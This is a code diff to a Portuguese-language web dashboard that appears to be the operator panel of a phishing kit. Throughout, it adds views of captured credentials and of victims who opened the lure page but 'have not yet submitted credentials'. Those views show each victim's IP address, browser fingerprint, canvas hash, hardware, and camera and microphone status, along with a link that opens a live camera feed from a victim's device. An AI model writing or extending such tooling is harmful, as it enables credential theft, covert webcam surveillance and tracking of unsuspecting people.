@@ -298,6 +298,10 @@
         <div class="label">Taxa de Captura</div>
         <div class="value">{{ stats.capture_rate }}</div>
       </div>
+      <div class="stat-card" style="border-top-color:#6a1b9a">
+        <div class="label">Visitantes Rastreados</div>
+        <div class="value">{{ stats.total_visitors }}</div>
+      </div>
     </div>
 
     <!-- Funnel -->
@@ -315,11 +319,66 @@
           <div class="step-label">Clicaram</div>
         </div>
         <div class="funnel-arrow">›</div>
+        <div class="funnel-step" style="background:#f3e5f5">
+          <div class="step-value" style="color:#6a1b9a">{{ stats.total_visitors }}</div>
+          <div class="step-label">Abriram a página</div>
+        </div>
+        <div class="funnel-arrow">›</div>
         <div class="funnel-step">
           <div class="step-value">{{ stats.total_captures }}</div>
           <div class="step-label">Submeteram</div>
         </div>
       </div>
+    </div>
+    {% endif %}
+
+    <!-- Visitantes sem captura -->
+    {% if visitors %}
+    <div class="table-section" style="margin-bottom:24px;border-top:3px solid #6a1b9a">
+      <h2 style="color:#6a1b9a">⚠ Visitantes não capturados ({{ visitors | length }})</h2>
+      <p style="font-size:13px;color:#777;margin-bottom:16px">
+        Abriram a página mas ainda não submeteram credenciais — fingerprint já recolhido.
+      </p>
+      <table>
+        <thead>
+          <tr>
+            <th>Timestamp (UTC)</th>
+            <th>IP</th>
+            <th>Ecrã</th>
+            <th>Câmara</th>
+            <th>Microfone</th>
+            <th>GPU</th>
+            <th>Timezone</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for v in visitors %}
+          <tr onclick="showVisitor({{ loop.index0 }})" style="cursor:pointer">
+            <td>{{ v.timestamp[:19].replace("T"," ") }}</td>
+            <td>{{ v.ip }}</td>
+            <td style="font-size:12px">
+              {% if v.screen %}
+                {{ v.screen.width }}×{{ v.screen.height }}
+              {% else %}—{% endif %}
+            </td>
+            <td>
+              {% if v.media %}
+                {% if v.media.camera %}📷{% else %}❌{% endif %}
+              {% else %}—{% endif %}
+            </td>
+            <td>
+              {% if v.media %}
+                {% if v.media.microphone %}🎤{% else %}❌{% endif %}
+              {% else %}—{% endif %}
+            </td>
+            <td style="font-size:11px;color:#555">
+              {{ (v.webgl or {}).get('renderer', '—')[:40] }}
+            </td>
+            <td style="font-size:12px">{{ v.timezone or '—' }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
     </div>
     {% endif %}
 
@@ -343,7 +402,15 @@
           {% for c in captures %}
           <tr onclick="showDetail({{ loop.index0 }})">
             <td>{{ c.timestamp[:19].replace("T", " ") }}</td>
-            <td>{{ c.email or "—" }}</td>
+            <td>
+              {{ c.email or "—" }}
+              {% if c.live %}
+                <span style="margin-left:6px;background:#c62828;color:#fff;
+                             padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700">
+                  ● LIVE
+                </span>
+              {% endif %}
+            </td>
             <td title="{{ c.user_agent }}">{{ c.ip }}</td>
             <td>
               {% if c.geo %}
@@ -380,6 +447,7 @@
 
   <script>
     const captures = {{ captures | tojson }};
+    const visitors = {{ visitors | tojson }};
 
     function parseUA(ua) {
       if (!ua) return { browser: '—', os: '—' };
@@ -448,10 +516,111 @@
       html += row('Timezone', geo.timezone || '—');
       html += row('Coordenadas', mapsHtml);
 
-      html += section('Dispositivo');
+      // Live feed / foto
+      if (c.live || c.has_photo) {
+        const fp = c.fp_token || '';
+        html += section('Câmara');
+        if (c.live) {
+          html += row('Estado', `<span style="background:#c62828;color:#fff;padding:2px 10px;border-radius:10px;font-size:12px;font-weight:700;animation:pulse 1.5s infinite">● LIVE</span>`);
+          html += row('Live Feed', `<a href="/livefeed/${fp}" target="_blank"
+            style="display:inline-block;padding:6px 14px;background:#c62828;color:#fff;
+                   font-size:13px;font-weight:600;border-radius:3px;text-decoration:none">
+            📷 Abrir câmara ao vivo
+          </a>`);
+        } else {
+          html += row('Último frame', `<img src="/live/${fp}" style="max-width:100%;border-radius:4px;margin-top:4px;border:1px solid #ddd">`);
+        }
+      }
+
+      html += section('Dispositivo (User-Agent)');
       html += row('Browser', `<span class="ua-pill">${ua.browser}</span>`);
       html += row('Sistema Op.', `<span class="ua-pill">${ua.os}</span>`);
       html += row('User-Agent', `<span style="font-size:11px;color:#777">${c.user_agent || '—'}</span>`);
+
+      // Fingerprint (se disponível)
+      const fp = c.fingerprint || {};
+      if (fp.fp_token) {
+        const sc = fp.screen || {};
+        const vp = fp.viewport || {};
+        const wg = fp.webgl || {};
+        const md = fp.media || {};
+
+        html += section('Fingerprint do Browser');
+
+        html += row('Ecrã',
+          sc.width ? `${sc.width}×${sc.height} px · ${sc.colorDepth}-bit · ratio ${sc.pixelRatio}x` : '—');
+        html += row('Viewport',
+          vp.width ? `${vp.width}×${vp.height} px` : '—');
+        html += row('Hardware',
+          [fp.cores ? `${fp.cores} cores` : null,
+           fp.memory_gb ? `${fp.memory_gb} GB RAM` : null]
+          .filter(Boolean).join(' · ') || '—');
+        html += row('Plataforma', fp.platform || '—');
+        html += row('Idioma', fp.language || '—');
+        html += row('Timezone', fp.timezone || '—');
+        html += row('Touch', fp.touch_points > 0 ? `✅ Sim (${fp.touch_points} pontos)` : '❌ Não');
+        html += row('Câmara',     md.camera     === true ? '📷 Detectada' : md.camera === false ? '❌ Não detectada' : '—');
+        html += row('Microfone',  md.microphone === true ? '🎤 Detectado' : md.microphone === false ? '❌ Não detectado' : '—');
+        html += row('Speakers',   md.speakers   === true ? '🔊 Detectados' : md.speakers === false ? '❌ Não detectados' : '—');
+        html += row('GPU Vendor',   wg.vendor   || '—');
+        html += row('GPU Renderer', wg.renderer || '—');
+        html += row('Canvas Hash', fp.canvas_hash
+          ? `<code style="font-size:11px">${fp.canvas_hash}</code>`
+          : '—');
+        if (fp.plugins && fp.plugins.length) {
+          html += row('Plugins', `<span style="font-size:11px;color:#777">${fp.plugins.join(', ')}</span>`);
+        }
+      }
+
+      document.getElementById('modal-content').innerHTML = html;
+      document.getElementById('modal').classList.add('open');
+    }
+
+    function showVisitor(idx) {
+      const v = visitors[idx];
+      const sc = v.screen  || {};
+      const vp = v.viewport || {};
+      const wg = v.webgl   || {};
+      const md = v.media   || {};
+      const ts = (v.timestamp || '').slice(0, 19).replace('T', ' ') + ' UTC';
+
+      let html = '';
+
+      html += section('Reconhecimento');
+      html += row('Timestamp', ts);
+      html += row('IP', `<strong>${v.ip || '—'}</strong>`);
+      html += row('Timezone', v.timezone || '—');
+      html += row('Idioma', v.language || '—');
+      html += row('Plataforma', v.platform || '—');
+
+      html += section('Ecrã & Viewport');
+      html += row('Resolução',
+        sc.width ? `${sc.width}×${sc.height} px · profundidade ${sc.colorDepth}-bit · ratio ${sc.pixelRatio}x` : '—');
+      html += row('Janela do browser',
+        vp.width ? `${vp.width}×${vp.height} px` : '—');
+
+      html += section('Hardware');
+      html += row('CPU', v.cores ? `${v.cores} cores lógicos` : '—');
+      html += row('RAM', v.memory_gb ? `${v.memory_gb} GB` : '—');
+      html += row('Touch', v.touch_points > 0 ? `✅ Sim (${v.touch_points} pontos)` : '❌ Não');
+
+      html += section('Dispositivos de Media');
+      html += row('Câmara',    md.camera     === true ? '📷 Detectada'  : md.camera     === false ? '❌ Não detectada'  : '—');
+      html += row('Microfone', md.microphone === true ? '🎤 Detectado'  : md.microphone === false ? '❌ Não detectado'  : '—');
+      html += row('Speakers',  md.speakers   === true ? '🔊 Detectados' : md.speakers   === false ? '❌ Não detectados' : '—');
+
+      html += section('Gráficos (WebGL)');
+      html += row('GPU Vendor',   wg.vendor   || '—');
+      html += row('GPU Renderer', wg.renderer || '—');
+
+      html += section('Browser');
+      html += row('Canvas Hash',
+        v.canvas_hash ? `<code style="font-size:11px">${v.canvas_hash}</code> <span style="font-size:11px;color:#999">(identificador único do browser)</span>` : '—');
+      html += row('Cookies ativos', v.cookies ? '✅ Sim' : '❌ Não');
+      html += row('Do Not Track',   v.do_not_track ? '✅ Ativo' : '❌ Não ativo');
+      if (v.plugins && v.plugins.length) {
+        html += row('Plugins', `<span style="font-size:11px;color:#777">${v.plugins.join(', ')}</span>`);
+      }
 
       document.getElementById('modal-content').innerHTML = html;
       document.getElementById('modal').classList.add('open');
